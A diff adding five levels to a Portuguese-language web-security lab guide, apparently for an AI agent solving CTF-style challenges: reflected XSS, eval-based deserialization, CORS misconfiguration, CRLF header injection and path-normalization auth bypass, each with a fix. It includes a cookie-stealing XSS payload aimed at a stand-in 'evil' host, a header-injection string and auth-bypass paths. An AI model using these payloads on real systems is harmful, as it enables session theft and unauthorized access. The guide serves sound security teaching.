@@ -443,6 +443,108 @@ armazenar uploads **fora da raiz web** e sem permissão de execução; nunca
 
 ---
 
+## Nível 23 — Reflected XSS (Cross-Site Scripting refletido)
+
+**Conceito.** Entrada do usuário é refletida no HTML **sem escapar**, então um
+payload com `<script>` (ou `<img onerror=…>`, `onload`, `javascript:`) executa no
+navegador da **vítima**. XSS é uma falha *client-side*: o código roda no browser
+de quem abre a página, permitindo roubo de cookie/sessão, ações em nome da vítima.
+
+**Exploração.** Injetar um vetor de execução no parâmetro refletido e fazer a
+vítima abrir a URL. Ex.: `?q=<script>fetch('//evil/?c='+document.cookie)</script>`.
+
+**No lab.** `GET /buscar?q=<script>...</script>` — o termo é ecoado sem escape.
+Como o agente não tem navegador, o lab **simula a vítima**: ao detectar um vetor
+de execução no `q` refletido, devolve a flag no corpo (como se o admin tivesse
+aberto a busca). Num alvo real, a prova seria o JS executando no browser.
+
+**Correção.** Escapar saída por contexto (HTML/atributo/JS), `Content-Security-Policy`,
+cookies `HttpOnly`; frameworks que auto-escapam por padrão.
+
+---
+
+## Nível 24 — Insecure Deserialization (eval sobre dado do cliente)
+
+**Conceito.** O app **desserializa dado controlado pelo cliente** de forma
+insegura — aqui, `eval(base64decode(cookie))`. Equivale a `pickle.loads`/`yaml.load`
+sobre entrada não confiável: o atacante envia uma estrutura/expressão que executa
+código no servidor (CWE-502 → RCE).
+
+**Exploração.** Enviar um payload serializado malicioso. No caso de `eval`, uma
+expressão Python que lê um segredo do escopo ou executa comandos.
+
+**No lab.** Cookie `prefs` = base64 de uma expressão; `/painel` faz
+`eval(prefs, {FLAG, VERSION})`. A nota do dev revela que `FLAG` está no escopo →
+enviar `prefs = base64("FLAG")` faz o `eval` devolver a flag. (Ferramentas:
+`b64_encode` + `http_request` com header `Cookie`.) Pickle teria o mesmo defeito,
+mas exige opcodes binários — por isso o lab usa `eval`, resolvível pelo agente.
+
+**Correção.** Nunca desserializar dado não confiável com `eval`/`pickle`/`yaml.load`;
+usar formatos puros (JSON) + validação de schema; assinar/cifrar dados de sessão.
+
+---
+
+## Nível 25 — CORS misconfiguration (Origin refletido + credenciais)
+
+**Conceito.** A API reflete **qualquer** `Origin` em
+`Access-Control-Allow-Origin` e ainda manda `Access-Control-Allow-Credentials: true`.
+Isso permite que um site terceiro (`evil.example`), no navegador da vítima
+autenticada, faça uma requisição *cross-origin com credenciais* e **leia** a
+resposta — vazando dados privados.
+
+**Exploração.** Hospedar uma página em outra origem que faz
+`fetch(api, {credentials:'include'})`; como o ACAO reflete a origem do atacante, o
+browser entrega a resposta autenticada ao script malicioso.
+
+**No lab.** `GET /api/dados` com cookie `session` + header `Origin` cross-origin
+devolve a flag no corpo (o agente não vê o header ACAO, então a prova vem no
+corpo). Requisição same-origin ou sem cookie **não** libera. (Ferramenta:
+`http_request` com headers `Origin`/`Cookie`.)
+
+**Correção.** Allowlist estrita de origens; **jamais** combinar ACAO refletido/curinga
+com `Allow-Credentials: true`; validar `Origin` server-side.
+
+---
+
+## Nível 26 — CRLF / HTTP Header Injection
+
+**Conceito.** Entrada do usuário entra num **header de resposta** (`Location`,
+`Set-Cookie`) sem filtrar `\r\n`. Como o valor passa por url-decode, `%0d%0a`
+quebra a linha do header e permite **injetar headers próprios** (ex.:
+`Set-Cookie: role=admin`) ou dividir a resposta (*response splitting*).
+
+**Exploração.** `?next=/x%0d%0aSet-Cookie:role=admin` → o servidor emite um
+`Set-Cookie` controlado pelo atacante; variações injetam cabeçalhos de cache,
+CORS, ou corpo extra.
+
+**No lab.** `GET /ir?next=...%0d%0a...` — ao detectar CRLF no `next`, o lab
+confirma a injeção e devolve a flag no corpo (o cliente não expõe o header
+injetado). (Ferramenta: `http_request` com `%0d%0a` na URL.)
+
+**Correção.** Rejeitar/encodar CR/LF em qualquer valor destinado a header;
+validar URLs de redirect contra allowlist; usar APIs de header que proíbem CRLF.
+
+---
+
+## Nível 27 — Auth bypass por normalização de path
+
+**Conceito.** A **autorização** decide sobre a string crua do path (bloqueia
+exatamente `/admin`), mas o **roteamento** serve o recurso sobre o path
+*normalizado* (resolve `.`, `..`, `//`, `%2e`, barra final). A divergência entre
+os dois cria um bypass: variantes que normalizam para `/admin` escapam do bloqueio.
+
+**Exploração.** `/admin/`, `//admin`, `/./admin`, `/%2e/admin` (e, em servidores
+reais, truques como `/admin..;/`) — todos chegam ao handler admin sem passar pelo
+check exato.
+
+**No lab.** `GET /admin` → 403; `GET /admin/` (ou `/%2e/admin`) → 200 + flag.
+(Ferramenta: `http_request` variando o path.)
+
+**Correção.** **Normalizar/canonicalizar ANTES de autorizar** e usar o mesmo path
+canônico no controle de acesso e no roteamento; default-deny.
+
+---
+
 ## Princípios transversais
 
 - **Nunca confie na entrada do cliente** — corpo, query, headers (`Host`,
